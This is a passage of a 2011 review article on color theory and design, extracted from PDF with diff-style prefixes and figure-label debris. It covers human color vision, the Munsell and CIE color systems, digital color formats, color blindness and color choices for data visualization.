+statistical, scientific, and data visualization. Color theory is inextricably linked
+to the physiology of the human visual system, and color design is similarly
+inextricably linked to human perception. We discuss color perception in the
+human visual system. We then quantify color perception in terms of the Munsell
+System and the International Commission on Illumination (CIE) color space. We
+continue to discuss color design with a perspective on individuals with defective
+color perception and finally conclude with a discussion of color design for the use
+of color in presentations.
+2011 John Wiley & Sons, Inc.WIREs Comp Stat2011 3 104–118 DOI:
+## 10.1002/wics.146
+## HUMAN VISUAL SYSTEM
+## T
+he perception of color has at least two major
+components.  On  the  one  hand,  color  can
+be discussed simply as a phenomenon of certain
+wavelengths of electromagnetic radiation. On the
+other hand, most electromagnetic radiation cannot be
+perceived by human beings. It is the very narrow band
+of electromagnetic radiation that can be perceived
+by humans that we call light and which leads to an
+incredible sensory experience that we call vision. It is
+this marvelous confluence of, in some sense, absolute
+wavelengths of electromagnetic radiation and psycho-
+physical decoding of these wavelengths in the human
+visual system that gives rise to the perception of color.
+Human vision relies on light sensitive cells in the
+retina of the eye. There are two basic kinds of sensors.
+These are rods and cones. Rods are cells which can
+work at very low light intensity (scotopic), but cannot
+resolve sharp images or color. The rods contain a
+pigment,rhodopsin, also calledvisual purple, which
+saturates at higher levels of light. Cones are cells
+that can resolve sharp images and color, but require
+much higher light levels to work. Figure 1 illustrates
+the major components of the human eye. Both the
+rod cells and the cone cells are located on the retina.
+The central part of the retina is called thefovea,
+which is where cells responsible for vision are most
+densely located. There are about 10
+## 7
+foveal cones.
+The combined information from these sensors is sent
+to the brain and enables human vision.
+## ∗
+Correspondence to: ewegman@gmail.com
+Center for Computational Data Sciences, George Mason University,
+Fairfax, VA, USA
+DOI: 10.1002/wics.146
+There are three types of cones. A somewhat
+simplistic interpretation is that red cones are sensitive
+to red light, green cones are sensitive to green light, and
+blue cones are sensitive to blue light. More precisely,
+the cones are sensitive to long, medium, and short
+wavelengths of light. The peak response of the cones
+do not actually occur precisely in the red, green,
+and blue color bands, but the perception of color
+depends on contrast among the stimulation levels of
+the different cell types.
+With the simplification of red, green, and blue
+cones in mind, when red light hits the eye, the cones
+sensitive to red are excited, causing a particular
+sensation in the brain. That is what we call ‘red.’
+This is what physically happens when we observe, say
+a tomato in neutral daylight: the sunlight, composed
+of electromagnetic waves with wavelengths from 380
+to 780 nm, shines on the tomato. The tomato absorbs
+the light from 380 to 580 nm and reflects the light
+from 580 to 780 nm. This light reaches the eyes,
+where it excites the cones that have their sensitivity
+centered on 570 nm. The signals from these cones are
+finally processed by our brain. We are taught that this
+particular sensation is called ‘red.’
+The relationship between wavelength and actual
+hue is roughly:
+•620–730 nm: red
+•590–610 nm: orange
+•550–580 nm: yellow
+•490–540 nm: green
+•450–480 nm: blue
+•380–440 nm: violet.
+1042011 John Wiley & Sons, Inc.Volume 3, March/April 2011
+
+WIREs Computational StatisticsColor theory and design
+## Pupil
+## Iris
+Posterior chamber
+## Zonular
+fibres
+## Retina
+## Choroid
+## Sclera
+Optic disc
+Optic nerve
+## Fovea
+## Retinal
+blood vessels
+## Cornea
+Anterior chamber
+(aqueous humour)
+Ciliary muscle
+## Suspensory
+ligament
+## Hyaloid
+canal
+## Vitreous
+humour
+## Lens
+FIGURE 1|Schematic diagram of the human eye. This image is used under the Creative Commons Attribution-Share Alike 3.0 License. Details are
+at http://creativecommons.org/licenses/by-sa/3.0/legalcode.
+The colors we see are affected by the intensity
+of light and by its spectral content. At low levels of
+illumination, objects are less colorful because rods
+are dominant. In bright daylight, we see more color,
+contrast, and saturation because cones dominate.
+Figures 2 and 3 illustrate these effects.
+## COLOR THEORY
+Based on the notion that all color perception in
+humans can be reconstructed using the three so-called
+primary colors, red, green, and blue, a theory of color
+perception can be developed. It should be noted that
+other animals may have more or less color perception
+or no color perception at all. Indeed, the pigments in
+the eyes can vary from one animal group to another
+and can be used to tell theevolutionary distance
+between animal groups.
+## 1
+Thus color theory based on
+red, green, and blue applies to human color perception
+and not necessarily to any other animal groups.
+Additive color processes, such as television,
+work by having the capability to generate an image
+composed of red, green, and blue light. Because the
+intensity information for each of the three colors is
+preserved, the image color is preserved as well. The
+spectral distribution of the image will probably be
+wrong, but if the degree of intensity for each of the
+primary colors is correct, the image will appear to be
+the right color. Red, green, and blue are the additive
+primary colors because they correspond to the red,
+green, and blue cones in the eye.
+Subtractive color processes work by blocking out
+parts of the spectrum. The idea of subtractive color
+is to reduce the amount of undesired color reaching
+the eye. If, for example, one had a yellow image, one
+would want to have a dye that would let red and
+green reach the eye, and block out blue. The additive
+secondaries become the subtractive primaries, because
+each of the additive secondaries will reflect two of the
+additive primaries, and absorb one of the additive
+primaries (Figures 4 and 5). See also Table 1.
+With this information, in a subtractive color
+system, such as printed documents that reflect light,
+if we wanted red, we would mix magenta and yel-
+low. Magenta would absorb green, and yellow would
+Volume 3, March/April 20112011 John Wiley & Sons, Inc.105
+
+## Overview
+www.wiley.com/wires/compstats
+FIGURE 2|Image at low level of illumination so that it is less colorful. Rods would dominate. Photo by Yasmin Said.
+FIGURE 3|Image at high level of illumination in open air market. Cones would dominate. Photo by Edward Wegman.
+absorb blue, leaving only red to be reflected back
+to the eye. For black, a combination of all three
+would be used, which should, in principle, block
+out all light. In practice, printers use black as well,
+because the dyes used in printing are not perfect, and
+some light from other parts of the spectrum still is
+reflected.
+A useful observation in an additive color system
+is that because magenta is made of red and blue in
+equal intensities, that mixing magenta and green is,
+1062011 John Wiley & Sons, Inc.Volume 3, March/April 2011
+
+WIREs Computational StatisticsColor theory and design
+TABLE 1Additive Secondaries/Subtractive Primaries Absorption
+## Chart
+ColorReflectsAbsorbs
+YellowRed and greenBlue
+MagentaRed and blueGreen
+CyanGreen and blueRed
+FIGURE 4|Additive secondaries are derived by combining primary
+colors.
+FIGURE 5|Subtractive primaries mixing chart.
+in effect mixing red, blue, and green, which should
+give us pure white. Thus in an additive color system,
+magenta and green are complementary colors. In the
+same way, red and cyan are complementary colors and
+yellow and blue are complementary colors. Figure 6,
+which is a somewhat doctored black and white
+photograph of the late Professor Sam Wilks illustrates
+the complementary nature of these color pairs. One
+can take advantage of these complementary pairs in
+data visualization as well as anaglyph stereo. In the
+data visualization context, if one has two clusters, it
+is useful to brush one with, say, red and the other
+with, say, cyan. These colors together make white, so
+where the clusters overlap, the mixing of colors will
+yield white. Plotted against a black background, it
+becomes evident where the clusters overlap. Similarly
+FIGURE 6|Professor Sam Wilks illustrating additive
+complementary colors. This photo is used with permission of the Army
+Conference on Applied Statistics. Professor Wilks proposed the Army
+Design of Experiments Conference. The first such conference was held
+in October 1955 and was chaired by Professor Wilks.
+with anaglyph stereoscopic displays, it is useful to
+make one eye peer through a red filter and the other
+through a cyan filter. Thus the overall impression
+is a white background. Often, the anaglyph glasses
+are red and green giving a background color of
+yellow, or red and blue, giving a background color of
+magenta.
+Color can be defined by three properties:hue,
+saturation,andlightnessorbrightness.Whenwe
+call an object ‘red,’ we are referring to its hue.
+Hue is determined by the dominant wavelength. The
+saturation of a color rangesfrom neutral to brilliant.
+Colors are desaturated by mixing in white or gray or
+black. Lightness or brightness refers to the amount of
+light the color reflects or transmits.
+## The Munsell System
+Color ordering systems, such as the Munsell System,
+use the three properties of color to identify unique
+colors. Notice that colors are distributed in three
+dimensions:hue,chroma(saturation), andvalue
+(lightness). We commonly see colors arrayed in
+two dimensions. This is a useful, but incomplete
+representation. Value is the third dimension that
+is not shown in two-dimensional color wheels, but
+is often used in image editing software. Professor
+Albert Munsell’s (1885–1918) description of the
+color system was published in Refs 2,3. Munsell’s
+system was based on rigorous experimental research
+with careful measurements of human visual responses
+Volume 3, March/April 20112011 John Wiley & Sons, Inc.107
+
+## Overview
+www.wiley.com/wires/compstats
+FIGURE 7|Illustration of the Munsell color system. The vertical direction represents value or lightness. The radial direction represents Chroma or
+Saturation. The angular direction represents Hue. This image is used under the Creative Commons Attribution-Share Alike 3.0 License. Details are at
+http://creativecommons.org/licenses/by-sa/3.0/legalcode.
+to color (Figure 7). It persisted for many decades,
+eventually being superseded by systems such as
+the CIE (in French, Commission Internationale de
+l’Eclairage).
+CIE Models
+If  the  Munsell  system  established  the  three-
+dimensional nature of color perception, the CIE
+models attempt to establish numerical values.
+## 4,5
+## To
+measure and predict the appearance of a particular
+color, we need a way to link perception to numbers
+and formulas. Scientific color values were established
+earlier this century by the CIE group. CIE models
+for defining color space all rely on the same basic
+numbers. There are basically two variants of the CIE
+color space known respectively asCIE XYZandCIE
+xyY. As mentioned earlier, the cones within a human
+eye have stimulus response to different wavelengths,
+long, medium, and short wavelengths. These, we
+mentioned, are frequently designated as Red, Green,
+and Blue although the peak sensitivity of each type
+of cell does not correspond exactly to these colors.
+These are designated in the CIE system as CIEXYZ
+(Figure 8). The ability of the human eye to respond
+to three different wavelengths is calledtristimulus.It
+is, of course, possible for two sources of light with
+distinctly different spectral distributions to combine to
+present a tristimulus value to the eye and be recorded
+as a certain color. It is possible for another two
+sources of light with different spectral distributions
+from the first two to combine and present the same
+## 2.0
+## 1.5
+## 1.0
+## 0.5
+## 0.0
+## 400
+## 500600
+x(l)
+l/nm
+## 700
+y(l)
+z(l)
+FIGURE 8|XYZ Color matching functions as described in the text.
+## 4
+This image is used under the Creative Commons Attribution-Share Alike
+3.0 License. Details are at http://creativecommons.org/licenses/by-sa/
+## 3.0/legalcode.
+tristimulus value to the eye, which would therefore be
+recorded as the same color even though the combined
+spectrums are distinctly different. This effect is called
+metamerism.
+Because of the distribution of cone cells on the
+retina, color perception depends on the field of view
+with each individual having different distribution and
+different field of view. The CIE sought to eliminate
+this variability be defining astandard colorimetric
+observer. With the belief that most cones are located
+within 2
+## ◦
+of the fovea, the chromatic response of
+the standard colorimetric observer was taken to
+be the response of the average human within 2
+## ◦
+## .
+Based on extensive experimentation,
+## 6,7
+the standard
+1082011 John Wiley & Sons, Inc.Volume 3, March/April 2011
+
+WIREs Computational StatisticsColor theory and design
+colorimetric observer is characterized bythree color
+matching functions. The color matching functions are
+a numerical description of the chromatic response
+of the standard colorimetric observer, which is, of
+course, the average chromatic response of a number of
+humans. The CIE defines the color matching functions
+as
+x(λ),y(λ), andz(λ) whereλis the wavelength in
+nanometers.
+The tristimulus valuesX,Y,andZfor a color
+with spectral power distributionf(λ) are given in terms
+of the standard colormetric observer as
+## X=
+## ∫
+## ∞
+## 0
+f(λ)
+x(λ)dλ
+## Y=
+## ∫
+## ∞
+## 0
+f(λ)
+y(λ)dλ
+## Z=
+## ∫
+## ∞
+## 0
+f(λ)
+z(λ)dλ.
+The CIExyYcolor space is a derived color
+space. TheYvalue was designed to reflect the overall
+luminance (brightness, lightness). The remaining two
+dimensions are characterized by thexandyand are
+used to specify colors. Here the normalized values are
+given by
+x=
+## X
+## X+Y+Z
+y=
+## Y
+## X+Y+Z
+z=
+## Z
+## X+Y+Z
+## .
+The valuesxandyspecify the chromaticity
+diagram, independent of luminance. This diagram is
+illustrated in Figure 9.
+In the CIEXYZcolor space, the saturation
+(chroma in Munsell, purity in CIE) is the Euclidean
+## 0.9
+## 0.8
+## 0.7
+## 0.6
+## 500
+## 520
+## 540
+## 560
+## 580
+## 600
+## 620
+## 700
+## 490
+## 480
+## 470
+## 460
+## 380
+## 0.5
+## 0.4
+y
+## 0.3
+## 0.2
+## 0.1
+## 0.0
+## 0.0
+## 0.10.20.3
+## 0.4
+x
+## 0.5
+## 0.60.7
+## 0.
+## 8
+FIGURE 9|CIE xyY Chromaticity Diagram as a function ofxandy. The range 380 to 700 nm represents the range of perception of visible light
+for humans. Saturation as well as chroma are represented in this diagram. This image is used under the Creative Commons Attribution-Share Alike
+3.0 License. Details are at http://creativecommons.org/licenses/by-sa/3.0/legalcode.
+Volume 3, March/April 20112011 John Wiley & Sons, Inc.109
+
+## Overview
+www.wiley.com/wires/compstats
+distance between the position of one color (x,y)and
+the illuminant’s reference white (x
+w
+## ,y
+w
+), i.e. that set of
+three chromaticity values that determines the reference
+white in thexyplane divided by the same distance for
+a pure (monochromatic) color with the same hue
+## (x
+c
+## ,y
+c
+## )=ρ
+max
+## (x−x
+w
+## ,y−y
+w
+## )+(x
+w
+## ,y
+w
+) whereρ
+max
+is the maximum in the chromaticity diagram. Then
+purity is defined as
+p=
+## √
+## (x−x
+w
+## )
+## 2
+## +(y−y
+w
+## )
+## 2
+## √
+## (x−x
+c
+## )
+## 2
+## +(y−y
+c
+## )
+## 2
+## .
+In an RGB space, saturation can be thought of
+as the standard deviation,σ, of the color coordinates
+R(red),G(green), andB(blue). Lettingμbe the
+luminance, then
+σ=
+## √
+(R−μ)
+## 2
++(G−μ)
+## 2
++(B−μ)
+## 2
+## 3
+## .
+While Figure 9 represents the experimentally
+derived range of colors that a human being can
+see, mechanical reproduction of these colors typically
+occupy a much smaller range of available colors.
+This range of colors that are reproducible by a
+given technology is called thegamut. Measuring color
+allows us to compare the color gamut, or range of
+colors produced by different methods (Ref 8, Section
+18.7). Color transparency film produces a wide range
+of colors including some a monitor cannot display.
+Color printers and printing presses have different
+color gamuts. Roughly speaking in the order of
+decreasing gamut range the technologies are: color
+transparency film, color monitors and HDTV systems,
+NTSC systems, color printers, and printing presses.
+These systems can never capture all the colors that the
+eye can see, but they can simulate the appearance very
+successfully if color reproduction is understood and
+controlled.
+Another  important  characteristic  of  each
+component in the color production system is its
+gamma(γ). It is a number that indicates the
+relationship between the signal values at input and
+output of a particular device. Aγof 1 indicates a
+linear behavior. This means that the device’s output is
+directly proportional to its input. A color display may
+have a nonlinear color behavior. If the video signal
+at the input contains a value of 60% of full-scale
+red, the image on the screen may be only 30% of
+full-scale red (thus dark-red). This is why a scanned
+image normally looks darker when it is shown on a
+display. This behavior can be graphically displayed in
+aγcurve (Figures 10 and 11).
+γ
+correction
+## 1/2.2
+## CRT
+γ  2.2
+## 0.5
+## 0.5
+## 0.218
+## 0.218
+## 0
+## 0
+## 0.1
+## 0.2
+## 0.3
+## 0.4
+## 0.5
+## 0.6
+## 0.7
+## 0.8
+## 0.9
+## 1
+## 0.10.20.30.40.50.60.70.80.91
+FIGURE 10|Atypicalγcurve for a CRT. In order to correct for the
+nonlinearity in the display device, a complementaryγcorrection curve
+must be introduced. Note that near one and near zero theγcurve is
+close to the idea linear response. This means respectively whites are
+white and blacks are black. This image is used under the Creative
+Commons Attribution-Share Alike 3.0 License. Details are at
+http://creativecommons.org/licenses/by-sa/3.0/legalcode.
+To summarize the color concepts:
+•Hue: color with no black, white or gray added
+•Tint: hue+white
+•Shade: hue+black
+•Tone: hue+gray or hue+varying degrees of its
+complementary color
+•ValueorLightnessorBrightnessorLuminosity:
+how light or dark a color appears
+•IntensityorPurity: how bright or dull a
+color appears, also called saturation and/or
+chromaticity. Basically, how much of the hue
+is identifiable. Grays are achromatic, meaning
+no hue/color.
+## Digital Colors
+Although the CIE and Munsell color systems assume a
+continuous range of colors, in fact, when reproduced
+digitally, there are only a finite number of distinct
+colors available. Many of us from childhood would
+be familiar with the idea of a finite number of colors.
+Crayola crayons for beginners came in a box with 8
+colors (2
+## 3
+). More advanced color choices could be had
+in boxes of 16 colors (2
+## 4
+), or 32 colors (2
+## 5
+), or even 64
+colors (2
+## 6
+). The Crayola website
+## 9
+gives an interesting
+1102011 John Wiley & Sons, Inc.Volume 3, March/April 2011
+
+WIREs Computational StatisticsColor theory and design
+## (a)(b)(c)
+FIGURE 11|Illustration of the effect ofγadjustments. Notice that the whites remain white (T-shirt) and the blacks remain black (shadow). The
+middle image was what came from the digital camera. The left image is withγadjusted down, the right withγadjusted up. This illustration is
+courtesy of Edward Wegman.
+chronology of the development of the Crayola colors,
+including some interesting name changes reflecting
+political correctness. For example, Prussian blue was
+changed to midnight blue, flesh was changed to peach,
+and Indian red was renamed chestnut. There are
+currently 120 Crayola colors available close to the
+next power of 2, 2
+## 7
+## =128.
+Typically, digital colors are represented at the
+hinted-at powers of 2. Depending on the application,
+the color resolution can range from 2
+## 8
+to 2
+## 64
+.The
+GIF image file format uses 2
+## 8
+, i.e. 8 bit color or
+256 distinct colors. This is far from the range of
+colors the human eye can distinguish, so it is poor
+at representation of continuous tone images. The
+GIF file format compresses images in color space
+so that all colors are mapped into only one of the
+256 colors available. The usual recommendation is
+to use GIF file format only if the image has a small
+range of colors, e.g., in line drawings. The JPG (or
+JPEG) file format has a 24 bit color space, i.e.,
+## 2
+## 24
+=16,777,216. This amounts to 8 bits for each
+of red, green, and blue. JPG files are compressed
+spatially rather than in color space. Thus neighboring
+pixels may be somewhat averaged. However, because
+JPG is normally used for continuous tone images
+such as photographs, this spatial compression is not
+usually noticed. It is however detectable when JPG
+compression is used for line drawings. TIFF format
+files also employ 24 bit color and need not have any
+compression. Thus, if space is not of consideration,
+TIFF files are preferred. More recently, another image
+file format has emerged, the PNG format. This was
+created when the developers, Unisys, of the GIF format
+decided to enforce the patent on LZW compression
+on which the GIF file format is based. PNG format
+also is capable of millions of colors. The human
+eye is generally thought to be unable to distinguish
+## 2
+## 24
+distinct colors, so that for purposes of rendering
+images for human perception, 24 bit color is more
+than adequate. For scientific purposes, however, a
+higher color resolution is desirable. The HDF file
+format is used for the earth observing system (EOS),
+which has the capability of 2
+## 64
+, or 64 bit color. Most
+computer-based color schemes use a 24 bit color scale,
+8 bits in each of red, green, and blue, or equivalently
+256 levels for each of the colors. Thus (0,0,0) would
+represent black, (255,255,255) would represent white,
+(255,0,0) would represent pure red, etc. Color in a
+webpage can be specified by specifying the intensity of
+each of the RGB components. This is typically done in
+hexadecimal notation, where 0 ,..., 9 represent those
+numbers and A, B, C, D, E, F represent the numbers
+10, 11, 12, 13, 14, 15, respectively. Thus the code FF
+in hexadecimal is 255 in decimal notation. Thus the
+code for pure white in HTML would be %FFFFFF.
+## COLOR DEFICIENCIES IN HUMAN
+## VISION
+Deficiencies in human color vision can result from
+a number of causes. Perhaps the most frequent
+deficiency is caused by changes due to aging of
+the individual. Other deficiencies can result from
+defective performance of certain types of cones even if
+all three are present, missing types of cones, from
+altogether missing cones, or from trauma to the
+brain. Most of color theory is based on the notion
+of tristimulus meaning that there are three types of
+cones in the human eye, which have photopigment
+receptors that are sensitive to light in different
+wavelength ranges. Individuals with all three cone
+type are called trichromats. There is some indication
+Volume 3, March/April 20112011 John Wiley & Sons, Inc.111
+
+## Overview
+www.wiley.com/wires/compstats
+that some individuals may have a fourth type of
+photopigment so that they, indeed, might have four
+different types of cones and hence have an even richer
+color experience.
+## 10
+## The Elderly
+Because the general population is aging, the majority
+of difficulties with color perception is among the
+elderly. One of us defines elderly as elderly = max(65,
+age of EJW+10). The 2000 census indicated that
+12.4% of the US population was over 65 years old,
+and estimates by Hayutin
+## 11
+from the Stanford Center
+on Longevity indicate that by 2030 some 22% of
+the US population will be over 65. Indeed more than
+20% of residents of most developed economies will
+be older than 65. Deficiency of vision in the elderly
+is a result of yellowing and darkening of the lens and
+the shrinking of pupil size. Yellowing of the lens has
+the result of blocking short wavelength (blue) light so
+that the intensity of bluish colors is diminished. Of
+course, colors that have a blue component will shift in
+the perception of the elderly so that cyan, blue-gray,
+light blue, magenta will be affected and more difficult
+to distinguish. Because of the shrinking of the pupil
+size, less light will reach the photoreceptors in the eye
+so that colors generally appear darker that they would
+for younger individuals with similar illumination.
+For example, yellows may appear brown and blues
+may appear black. Of course, when considering color
+design for the elderly, these effects must be considered.
+More saturated primary colors are thus recommended.
+## Color Blindness
+There are three basic types of color impaired vision,
+what might be called color blindness. People with
+normal color vision, as mentioned before, are called
+trichromats. One less severe form of color impaired
+vision occurs when there is an overabundance or
+marked deficiency in cone cells with one of the three
+photopigments or when one of the photopigments
+responds to an unusual wavelength. The individuals
+are calledanomalous trichromats. Basically, anoma-
+lous trichromats can match color in the complete
+range of hues, but require extra stimulation of cer-
+tain primaries. They are not technically color blind,
+but, in general, have difficulty in distinguishing cer-
+tain colors that a normal trichromat would easily
+distinguish. Depending on which primary requires
+extra stimulus, anomalous trichromats fall into one of
+three categories:protoanomalous,deuteranomalous,
+ortritananomalous. The proportions of the anoma-
+lous trichromats are outlined in Table 2.
+TABLE 2Types and Percentages of Anomalous Trichromats.
+(Reprinted with permission from Ref 12. Copyright 2004)
+TypeCone% Male% Female
+ProtoanomalousRed1.0.02
+DeuteranomalousGreen4.9.38
+TritananomalousBlue∼0∼0
+TABLE 3Types and Percentages of Dichromats. (Reprinted with
+permission from Ref 12. Copyright 2004)
+TypeCone%Male%Female
+ProtanopeRed1.00.02
+DeuteranopeGreen1.10.01
+TritanopeBlue0.0020.002
+While anomalous trichromats have color vision,
+and so are not technically color blind, there is a
+definite impairment of color vision. Truly color blind
+individuals have either one, two or three deficient
+photopigments, i.e. they have only two types of cones,
+dichromats, one or no type of cones,monochromats.
+The encoding of the protein necessary for color
+recognition resides on the X chromosome. Because
+males have only one X chromosome, whereas females
+have two X chromosomes, color blindness is much
+more likely to occur in males. The effect is masked in
+females even if there is a defect in one X chromosome,
+the other will compensate. Table 2 reflects this effect
+because of the reduced production of one of the
+photopigments.
+For dichromats, there are some hues which they
+simply cannot perceive. Colors that would appear
+completely different for trichromats, would appear to
+be the same color (metamers) for the dichromat. As
+with the anomalous trichromats, the dichromats fall
+into one of three classes depending on which color
+photopigment they are missing. Table 3 outlines the
+types and percentages of dichromats.
+Again, because of absence of the protein
+necessary to produce photopigments, the prevalence
+of color blindness in males is substantially higher
+than in females as reflected in Table 3.Protonopes
+anddeuteranopesare red-green color blind and
+generally see only blues and yellows. Analogously,
+tritanopesare blue-yellow color blind and see only
+reds and greens. When the stimulus to the two
+types of photoreceptors is equal, the dichromat will
+perceive the color as gray. This is the so-called
+neutral point. For protonopes and deuteranopes, the
+neutral point are almost the same. For the protonope
+the neutral point is approximately 495 nm and for
+1122011 John Wiley & Sons, Inc.Volume 3, March/April 2011
+
+WIREs Computational StatisticsColor theory and design
+the deuteranope, the neutral point is approximately
+500 nm. These would appear to be a slightly bluish
+green to a trichromat individual. At wavelengths lower
+than the neutral point, these dichromats would see a
+rapidly saturated blue and wavelengths higher than
+the neutral point they would see a rapidly saturated
+yellow. Thus they can easily distinguish these colors.
+Of course, while protonopes and deuteronopes are
+deficient in the range of hues, they are not deficient
+in the range of lightness and saturation. Unless a
+color is pure or saturated, dichromats will still have
+some perception of the deficient color. For example,
+a protonope will have no red receptors. However, the
+green photopigment is still slightly responsive a long
+wavelengths and the rods also will also be receptive,
+so some perception of the red color can be made,
+although the protonope may not recognize it as ‘red’
+(see Figure 8). Similarly, for the deuteranope. The
+neutral point for the tritanope is about 570 nm, which
+would appear yellow to a normal trichromat. Higher
+wavelengths would appear red and lower ones green.
+‘The description of dichromatic color perception
+comes from both theory and from studies of a
+few people who were dichromatic only in one eye.
+However, it’s not absolutely conclusive. First, there
+is no guarantee that the normal eye of a unilateral
+dichromatic is really normal. Second, studies often
+find that dichromatic color vision is much better
+than that predicted by theory. The best guess is that
+rods activate the red component red-green opponent
+process to give dichromats a weak three-dimensional
+color space.’ (Ref 12)
+Monochromats are a most interesting case. They
+may have only one photopigment for their cones or
+as is often the case they have no cones, only rods.
+Monochromats are truly color blind. Those with rods
+only generally have poor vision. They can match any
+color only in the sense of gray scale and so sat-
+uration and brightness are difficult to distinguish.
+## Green
+## 12
+reports that monochromats are exceedingly
+rare occurring in 1 case in 10,000,000. Finally, brain
+damage can create a very rare condition calledachro-
+matopsia, individual who are also monochromats.
+One interesting situation is the case of albinism,
+lack of the pigment melanin. This is a genetic disorder
+calledoculocutaneous albinism. In order to exhibit
+albinism, one must inherit a mutant allele from both
+the mother and the father, thus males and females are
+affected equally for autosomal disorders. The disease
+is characterized either by the failure to synthesize
+pigment proteins or the failure of integratory proteins
+to implement them into tissue. The pigment may be
+missing from skin, hair, and eyes. People affected
+with albinism frequently have difficulty with vision,
+although it is not a given that they will be color blind.
+Both albinism and color blindness have to do with the
+failure to synthesize pigment proteins, but they can
+and often are independent conditions.
+## COLOR DESIGN
+The use of color as a design element entails both
+a physiological response from the viewer as well
+as a response based in a cultural context. For
+example, while many Western brides wear white
+dresses as a symbol of purity, Chinese brides usually
+wear red, a color that is a symbol of good luck.
+The use of color symbolism varies tremendously
+from culture to culture. However, there are still
+certain physiological responses that are products of
+the human visual system combined with experience
+common to all humans. For example, distant objects
+often appear as bluish and somewhat indistinct as,
+for example, viewing mountains or forests from a
+distance. This is a consequence the greater refractive
+index for shorter wavelength of light. This bluish
+hazing effect is known asaerial perspectiveand is an
+experience common to all cultures. This is why the
+sky appears blue. Similarly, this same refractive index
+effect is why the moon appears reddish when low in
+the sky.
+From the perspective of data visualization, it
+is fruitful to understand the distinction between a
+cultural understanding of color and a physiological
+response to color. From a physiological perspective,
+color perception is a nearly automated function of
+the brain. Color perception has evolved with human
+beings over several hundred million years. As Green
+## 12
+points out
+‘...color perception is fast, accurate, automatic, and
+effortless. On the other hand, thinking is a relatively
+recent evolutionary advance, and we are not yet very
+good at it. Thinking means reading text, attaching
+meaning to an icon, searching memory, etc. These
+activities are relatively slow, error-prone, require
+mental resources and effort and take learning.’
+It is unlikely, even if an individual is a dichromat,
+that he would confuse orange with blue, but even
+an individual with completely normal vision can
+easily misread a word in a paragraph. This is why
+proofreading is a difficult task. The brain interprets
+what it expects to see and the thinking process
+required for careful reading is relatively slow and
+error prone. There are certain physiological reactions
+that are in essence hard-wired, such as grouping,
+linking, and depth perception. There are also color
+Volume 3, March/April 20112011 John Wiley & Sons, Inc.113
+
+## Overview
+www.wiley.com/wires/compstats
+## VISUALIZATION
+## V
+## SUA
+## L
+## I
+## Z
+## A
+## TI
+## O
+## N
+## I
+FIGURE 12|The word, VISUALIZATION, when rendered all in green
+is much easier to read compared with the same word in multiple colors.
+The all green word is naturally grouped because of the common color,
+whereas that effect is not found in the multi-colored word.
+design principles that are common and are interpreted
+as harmonious or garish color combinations. These
+principles are frequently used by artists and graphic
+designers. Finally there are elements in the use of
+color, which are interpreted in the context of culture.
+Hard-Wired Perception
+Several features of color perception are hardwired
+into the human brain. As mentioned in the previous
+paragraph, one of these is grouping and linking. If
+groups are rendered in distinct colors, then color
+associates groups together even if they are physically
+separated in space. Figure 12 illustrates the effect
+of color grouping by associating letters that have
+the same color. This effect can be used in data
+visualization by brushing clusters in a data display
+with distinct colors to associate elements of the cluster.
+A  second  related  illustration  is  found  in
+Figure 13. In this figure, we illustrate the use of color
+for spatial association. The point of Figure 13 is that
+not only does the color provide a visual linking, but
+also that this linking is enhanced with very distinctive
+hues. In our CrystalVision software,
+## 13
+we provide the
+three primary additive colors and the three secondary
+additive colors as the default brushing colors, i.e.,
+red, green, blue, cyan, magenta, and yellow. These six
+colors provide, in some sense, the maximal separation
+of hues. Figure 14 is a screen shot of CrystalVision
+illustrating these grouping and linking effects.
+Use of hue for grouping and linking is natural for
+certain data visualization tasks. We have already seen
+the effect for clustering. Hue is also good for showing
+categorical (nominal scale) variable. People naturally
+break the hues into categories, which they quickly
+and easily judge as being the same or different. This
+makes color an ideal way to indicate that objects have
+similar or different meaning, function, or importance.
+One can easily distinguish 12 or so colors: red, green,
+blue, yellow, orange, magenta, pink, brown, cyan,
+black, gray, white. On the other hand, hue is poor
+for showing quantitative (continuous) variables, i.e.
+more/less, bigger/smaller, because there is no natural
+ordering. Some advocate use of the ‘rainbow scale,’
+red–orange–yellow–green–blue–violet, as a natural
+ordered representation with blue as less and red as
+more. People may have learned this order to an extent,
+but it is not a very powerful innate perception. If it
+works at all, it is probably because it approximates
+a brightness scale: blue is dark, green is middle
+brightness, and yellow is high brightness.
+Figure 15 illustrates another effect of color
+contrast. The left panel of the figure has a dark
+foreground  and  a  yellow  background.  On  the
+right-hand panel the background color is yellow
+and the foreground color is the dark blue–green.
+These panels illustrate a perceptual the impact
+of foreground–background contrast. Most printed
+materials use black or colored ink on white paper,
+which makes the darker color appear to pop out
+of the background. Indeed, astronomers historically
+have printed black and white sky photos as negatives
+in order to see fine detail. On the other hand, the
+light against a dark background, such as illustrated in
+Figure 14, allows a much more detailed comparison
+of hues. Both cyan and yellow tend to be considerably
+less prominent against a white background which is
+why we typically prefer to use a black background. In
+FIGURE 13|The figure on the left is composed of all blue tones, whereas the samepattern on the right has bright (primary) contrasting colors. It
+is considerably easier to distinguish the two groups on the right-hand side because of the color contrast.
+1142011 John Wiley & Sons, Inc.Volume 3, March/April 2011
+
+WIREs Computational StatisticsColor theory and design
+FIGURE 14|Screen shot of CrystalVision parallel coordinate display illustrating the grouping and linking effects. The color bars on the upper
+left-hand side are the six default brushing colors. Notice that the axes arecolored red while the axes labels are cyan. These are complementary colors
+which are in some sense maximally different, and which add to white.
+## TEXTTEXT
+FIGURE 15|Foreground–background separation.
+general, achromatic background are preferred in order
+to have maximal use of color in data visualization.
+Color Design Based on the Color Wheel
+As we have indicated in the Color Theory Section,
+the modern view of color perception depends on the
+notion of tristimulus and the experimental results that
+the normal human eye has three photopigments in its
+cones, which roughly correspond to red, green, and
+blue. These three hues are taken to be the primary
+colors. Historically, the artistic view was that red,
+yellow, and blue were the primaries. This has led
+to the fact that some color wheels begin with these
+as primaries and mixing these yield secondary and
+tertiary hues which are usually characterized as RYB
+color wheels. A color wheel which is based on RGB
+as the primaries is usually known as HSV (hue,
+saturation, and value) color wheel. A simplification
+showing only fully saturated hues can be used in for
+purposes of color design.
+Figure 16 illustrates the RYB color wheel. The
+RYB color wheel was originally described by Isaac
+Newton in his 1704 treatise onOpticks.
+## 14
+## The 18th
+century understanding of color vision was predicated
+on the idea that red, yellow, and blue were the primary
+colors. The use of the RYB color wheel as a model for
+complementary colors and as a basic tool for art and
+printing became well established. Two documents,
+## Goethe
+## 15
+and Chevreul,
+## 16
+became the handbooks for
+color theory. Even today the RYB color wheel is
+Volume 3, March/April 20112011 John Wiley & Sons, Inc.115
+
+## Overview
+www.wiley.com/wires/compstats
+## Red
+## Red-
+orange
+## Orange
